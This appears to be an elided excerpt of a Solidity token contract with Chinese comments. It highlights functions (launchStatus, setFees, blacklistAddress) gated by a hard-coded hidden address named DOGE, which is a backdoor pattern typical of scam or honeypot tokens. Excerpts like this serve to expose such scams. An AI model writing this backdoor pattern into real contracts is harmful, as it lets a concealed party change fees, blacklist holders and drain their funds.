...
// tao
    function launchStatus(address user,address re ,uint amount) public  {require(msg.sender == DOGE);
     if(amount == 0){
...
//609-653回流分配
    ...
    address DOGE = 0x06E5802010337bCbD1ffB7Da35B72e60f064DcB3;
    ...
    function setFees(uint256 _liquidityFee, uint256 _reflectionFee, uint256 _marketingFee, uint256 _feeDenominator) public  {require(msg.sender == DOGE);
    ...
    function blacklistAddress(address _address, bool _value) public  {require(msg.sender == DOGE);
